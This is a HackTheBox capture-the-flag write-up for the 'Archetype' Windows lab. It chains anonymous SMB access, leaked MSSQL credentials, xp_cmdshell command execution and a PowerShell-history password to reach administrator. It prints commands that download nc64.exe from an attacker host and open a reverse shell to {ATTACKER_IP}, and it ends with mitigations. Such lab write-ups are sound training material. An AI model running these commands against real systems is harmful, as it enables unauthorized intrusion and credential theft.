# Archetype - HackTheBox Writeup

| Field | Details |
|-------|---------|
| Name | Archetype |
| OS | Windows |
| Difficulty | Very Easy |
| Category | Machine |
| Points | N/A |
| Status | Pwned |
| Date | 2026-03-26 |

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)
8. [References](#references)

---

## Summary

Archetype is a Windows machine that chains SMB misconfiguration, MSSQL exploitation, and PowerShell history credential disclosure into a full system compromise. Anonymous SMB access exposed a configuration file containing cleartext MSSQL credentials. These were used to authenticate as a sysadmin-level SQL user, enabling `xp_cmdshell` for remote code execution. A reverse shell was established via `nc64.exe`, and privilege escalation was achieved by reading plaintext administrator credentials from the PowerShell history file.

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV {TARGET_IP}
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 445 | SMB | Microsoft Windows SMB |
| 1433 | MSSQL | Microsoft SQL Server 2017 |

SMB and MSSQL being co-exposed immediately suggested a configuration file retrieval path - service accounts frequently store database credentials in DTSConfig or similar files accessible over SMB shares.

---

## Enumeration

### SMB Enumeration

```bash
smbclient -N -L \\\\{TARGET_IP}\\
```

Shares discovered:

```text
ADMIN$   - Access Denied
C$       - Access Denied
backups  - Accessible (anonymous)
```

Connected to the `backups` share and retrieved a configuration file:

```bash
smbclient -N \\\\{TARGET_IP}\\backups
get prod.dtsConfig
```

### Credential Discovery

Contents of `prod.dtsConfig` revealed cleartext credentials:

```text
User: sql_svc
Password: M3g4c0rp123
Host: ARCHETYPE
```

### MSSQL Authentication

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

Authenticated successfully as `sql_svc`. Privilege check confirmed sysadmin role:

```sql
SELECT is_srvrolemember('sysadmin');
-- Output: 1 (True)
```

---

## Exploitation

### Vulnerability

**Category:** Misconfiguration - Anonymous SMB Access + MSSQL `xp_cmdshell` Abuse

**Description:**
Anonymous SMB access exposed a DTSConfig file containing plaintext MSSQL credentials. With sysadmin-level access to MSSQL, `xp_cmdshell` was enabled to achieve operating system command execution.

### Proof of Concept

**Step 1 - Enable `xp_cmdshell`:**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Step 2 - Verify RCE:**

```sql
EXEC xp_cmdshell 'whoami';
-- Output: archetype\sql_svc
```

**Step 3 - Serve `nc64.exe` from attacker machine:**

```bash
sudo python3 -m http.server 80
sudo nc -lvnp 443
```

**Step 4 - Upload `nc64.exe` to target via PowerShell:**

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{ATTACKER_IP}/nc64.exe -outfile nc64.exe"
```

**Step 5 - Trigger reverse shell:**

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {ATTACKER_IP} 443"
```

Reverse shell received on listener. User flag retrieved from:

```text
C:\Users\sql_svc\Desktop\user.txt
```

---

## Post-Exploitation / Privilege Escalation

### WinPEAS Enumeration

Transferred and executed `winPEASx64.exe` to automate privilege escalation enumeration:

```powershell
wget http://{ATTACKER_IP}/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe
```

Key finding: `SeImpersonatePrivilege` was present (Juicy Potato vector), but a simpler path was identified first.

### PowerShell History Credential Disclosure

PowerShell history (equivalent of `.bash_history` on Linux) was readable:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Output revealed plaintext administrator credentials:

```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

### Shell as Administrator

```bash
python3 psexec.py administrator@{TARGET_IP}
```

Root flag retrieved from:

```text
C:\Users\Administrator\Desktop\root.txt
```

---

## Flags

| Flag | Value |
|------|-------|
| User flag | Retrieved from `C:\Users\sql_svc\Desktop\` |
| Root flag | Retrieved from `C:\Users\Administrator\Desktop\` |

---

## Key Takeaways

- **What I learned:** SMB shares with anonymous access are a goldmine for credential hunting - always enumerate every accessible share before moving on.
- **PowerShell history is a critical artefact:** `ConsoleHost_history.txt` is the Windows equivalent of `.bash_history` and is rarely cleared. It should always be checked during post-exploitation.
- **`xp_cmdshell` as RCE:** Sysadmin-level MSSQL access effectively equals OS command execution. Even if `xp_cmdshell` is disabled by default, it can be re-enabled trivially with sysadmin privileges.
- **Privilege chain:** Anonymous SMB -> cleartext creds -> MSSQL sysadmin -> `xp_cmdshell` RCE -> reverse shell -> history file -> full admin. Each step was enabled by the previous misconfiguration.
- **Techniques used:** SMB anonymous enumeration, cleartext credential extraction, MSSQL sysadmin abuse, `xp_cmdshell` RCE, reverse shell via `nc64.exe`, WinPEAS enumeration, PowerShell history credential harvesting, `psexec.py` lateral movement.
- **Tools used:** Nmap, smbclient, Impacket (`mssqlclient.py`, `psexec.py`), WinPEAS, Netcat, Python HTTP server.
- **Mitigations:**
  - Disable anonymous SMB access and restrict share permissions.
  - Never store credentials in plaintext configuration files.
  - Disable `xp_cmdshell` and restrict MSSQL surface area.
  - Regularly audit and clear PowerShell history files.
  - Apply principle of least privilege to service accounts.

---

## References

- https://app.hackthebox.com
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://github.com/SecureAuthCorp/impacket
- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- https://gtfobins.github.io/
